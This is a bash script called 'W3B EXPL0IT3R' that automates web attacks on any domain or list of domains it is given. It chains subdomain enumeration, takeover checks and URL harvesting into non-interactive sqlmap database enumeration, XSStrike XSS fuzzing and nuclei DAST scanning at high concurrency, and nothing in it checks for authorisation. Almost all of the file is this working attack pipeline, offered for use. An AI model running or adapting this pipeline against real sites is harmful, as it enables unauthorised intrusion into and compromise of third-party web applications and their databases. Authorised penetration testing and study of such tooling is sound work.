#!/bin/bash
#
# Script for Subdomain Enumeration and Exploitataion by PushkraJ99
#

bold="\e[1m"
Underlined="\e[4m"
red="\e[31m"
green="\e[32m"
blue="\e[34m"
cyan="\e[0;36m"
yellow="\e[0;33m"
white="\e[0;37m"
end="\e[0m"
VERSION="v1.0.0 (2024-02-29)"

PRG=${0##*/}


Usage(){
	
Logo	
	while read -r line; do
		printf "%b\n" "$line"
	done <<-EOF
	\r
	\r# ${bold}${blue}Options${end}:
	\r    -d, --domain       - Domain To Enumerate
	\r    -l, --list         - List of domains
	\r    -h, --help         - Displays this help message and exit.
	\r    -v, --version      - Displays the version and exit.

	\r    - To run $PRG Against a Single Domains
	\r       $PRG -d testphp.vulnweb.com
	\r    - To run $PRG Against a list of Domains
	\r       $PRG -l domains.txt
EOF

	exit 1
}

Logo(){
echo -e $red$bold"""
                                     )   (      (             (                      (     
   (  (          )    (           ( /(   )\ )   )\ )      )   )\ )    *   )      )   )\ )  
   )\))(   '  ( /(  ( )\     (     )\()) (()/(  (()/(   ( /(  (()/(  ' )  /(   ( /(  (()/( 
  ((_)()\ )   )\()) )((_)    )\   ((_)\   /(_))  /(_))  )\())  /(_))  ( )(_))  )\())  /(_))
 _(())\_)()  ((_)\  ((_)_   ((_)  __((_) (_))   (_))   ((_)\  (_))   (_(_())  ((_)\  (_))  
 \ \((_)/ / |__ (_) | _ )   | __| \ \/ / | _ \  | |   /  (_)  |_ _|  |_   _| |__ (_) | _ \ 
  \ \/\/ /   |_ \   | _ \   | _|   >  <  |  _/  | |__ | () |   | |     | |    |_ \   |   / 
   \_/\_/   |___/   |___/   |___| /_/\_\ |_|    |____| \__/   |___|    |_|   |___/   |_|_\ 
                                           
                                               $yellow$bold with <3 Created By : PushkraJ99 :} 
"""$end
}


theend(){
echo -e $green$bold"""
                                     )   (      (             (                      (      
   (  (          )    (           ( /(   )\ )   )\ )      )   )\ )    *   )      )   )\ )   
   )\))(   '  ( /(  ( )\     (     )\()) (()/(  (()/(   ( /(  (()/(  ' )  /(   ( /(  (()/(  
  ((_)()\ )   )\()) )((_)    )\   ((_)\   /(_))  /(_))  )\())  /(_))  ( )(_))  )\())  /(_)) 
 _(())\_)()  ((_)\  ((_)_   ((_)  __((_) (_))   (_))   ((_)\  (_))   (_(_())  ((_)\  (_))_  
 \ \((_)/ / |__ (_) | _ )   | __| \ \/ / | _ \  | |   /  (_)  |_ _|  |_   _| |__ (_) |   \ 
  \ \/\/ /   |_ \   | _ \   | _|   >  <  |  _/  | |__ | () |   | |     | |    |_ \   | |) |
   \_/\_/   |___/   |___/   |___| /_/\_\ |_|    |____| \__/   |___|    |_|   |___/   |___/ 

             $yellow$bold Thank You For Using $red$bold W3B EXPL0IT3R$end $yellow$bold with <3 Created By $white$bold PushkraJ99 :} 
"""$end
}



domainscan() {
    local dir_name="Results $1"
    
    # Check if directory exists
    if [ -d "$dir_name" ]; then
        echo -e "$green$bold[!] Result Stored in '$dir_name'. $end"
    else
        # Create directory if it doesn't exist
        mkdir -p "$dir_name"
        echo -e "$green$bold[!] Result Stored in '$dir_name'. $end"
    fi
    cd "$dir_name"
    
    
    echo -e "$red$bold[!] Initializing W3B EXPL0IT3R on Domain -----> $green$bold $1 $end"
    subenum -d $1 -o sub.txt --parallel
    echo -e "\n"
    echo -e "$green$bold[!] Total  Enumerated $red$bold Subdomains $end$bold"
    cat "sub.txt"
    echo -e "\n"
    sleep 3
    echo -e "$green$bold[!] Finding Possible Alive $red$bold Subdomains $end"
    httpx-toolkit -l sub.txt -o subs.txt -silent
    echo -e "\n"
    sleep 3
    echo -e "$green$bold[!] Finding Possible $red$bold Subdomain Takeover $end"
    subzy run --targets subs.txt
    echo -e "\n"
    sleep 5
    paramspider -d $1 -o combined.txt
    echo -e "\n"
    
    sleep 5
    echo -e "$yellow$bold[+] Scanning for SQL Injection.....$end$bold"
    cat "$(pwd)/output/combined.txt" | uro | gf sqli | tee sql.txt
    echo -e "\n"
    python3 /usr/local/bin/sqlidetector/sqlidetector.py -w 1000 -f sql.txt 
    echo -e "\n"
    sqlmap --batch -m sql.txt --dbs
    echo -e "\n"
    
    sleep 5
    echo -e "$yellow$bold[+] Scanning for Cross Site Scripting .....$end$bold"
    sleep 5
    cat "$(pwd)/output/combined.txt" | uro | gf xss | Gxss -c 100 -o xss.txt
    echo -e "\n"
    cat xss.txt | while read url ; do python3 /usr/local/bin/XSStrike/xsstrike.py -u "$url" --fuzzer -t 1000 ; done 
    echo -e "\n"    
    
    sleep 5
    echo -e "$yellow$bold[+] Scanning for Automation.....$end$bold"
    nuclei -silent -l "$(pwd)/output/combined.txt" -dast ~/fuzzing-templates -c 50 -rl 200 -fhr -lfa -o autoexploit.txt
    theend
    exit  1
}



listscan() {
    local dir_name="Results"
    
    # Check if directory exists
    if [ -d "$dir_name" ]; then
        echo -e "$green$bold[!] Result Stored in '$dir_name'. $end"
    else
        # Create directory if it doesn't exist
        mkdir -p "$dir_name"
        echo -e "$green$bold[!] Result Stored in '$dir_name'. $end"
    fi

    echo -e "$red$bold[!] Initializing W3B EXPL0IT3R on List -----> $green$bold $1 $end"
    subenum -l $1 -o "$dir_name/sub.txt" --parallel
    echo -e "\n"
    echo -e "$green$bold[!] Total  Enumerated $red$bold Subdomains $end$bold"
    cat "$dir_name/sub.txt"
    echo -e "\n"
    sleep 3
    echo -e "$green$bold[!] Finding Possible Alive $red$bold Subdomains $end"
    httpx-toolkit -l "$dir_name/sub.txt" -o "$dir_name/subs.txt" -silent
    echo -e "\n"
    sleep 3
    echo -e "$green$bold[!] Finding Possible $red$bold Subdomain Takeover $end"
    subzy run --targets "$dir_name/subs.txt"
    echo -e "\n"
    sleep 3
    mkdir "$dir_name/output"
    cat $1 | httprobe | waybackurls | sed 's/=.*/=/' | uro | anew | grep "=" | tee "$dir_name/output/combined.txt"
    echo -e "\n" 

    cd "$dir_name"

    sleep 5
    echo -e "$yellow$bold[+] Scanning for SQL Injection.....$end$bold"
    cat "$(pwd)/output/combined.txt" | uro | gf sqli | tee sql.txt
    echo -e "\n"
    python3 /usr/local/bin/sqlidetector/sqlidetector.py -w 1000 -f sql.txt 
    echo -e "\n" 
    sqlmap --batch -m sql.txt --dbs
    echo -e "\n"
    
    sleep 5
    echo -e "$yellow$bold[+] Scanning for Cross Site Scripting ....$end$bold"
    cat "$(pwd)/output/combined.txt" | uro | gf xss | Gxss -c 100 -o xss.txt
    echo -e "\n"
    cat xss.txt | while read url ; do python3 /usr/local/bin/XSStrike/xsstrike.py -u "$url" --fuzzer -t 1000 ; done 
    echo -e "\n" 

    sleep 5
    echo -e "$yellow$bold[+] Scanning for Automation.....$end$bold"
    nuclei -silent -l "$(pwd)/output/combined.txt" -dast ~/fuzzing-templates/ -c 50 -rl 200 -fhr -lfa -o autoexploit.txt
    theend
    exit 1
}



Main() {
    [ "$domain" == False ] && [ "$hostslist" == False ]; 
#        echo -e $red"[-] Argument -d/--domain OR -l/--list is Required!"$end
    Usage
    
#	[ $domain == False ] && [ $hostslist == False ] && { echo -e $red"[-] Argument -d/--domain OR -l/--list is Required!"$end; Usage; }

}



while [ -n "$1" ]; do
	case $1 in
		-d|--domain)
		if [ -z "$2" ]; then
		    Usage
                else
                    domainscan $2 
                fi
			shift ;;
		-l|--list)
		if [ -z "$2" ]; then
		    Usage
                else
                    listscan $2 
                fi
			shift ;;
		-h|--help)
			Usage ;;
		-v|--version)
            Logo
			echo -e "$green$bold[!] Version: $VERSION $end"
			exit 0 ;;
		*)
			echo -e "[-] Unknown Option: $1"
			Usage ;;
	esac
	shift
done



Main
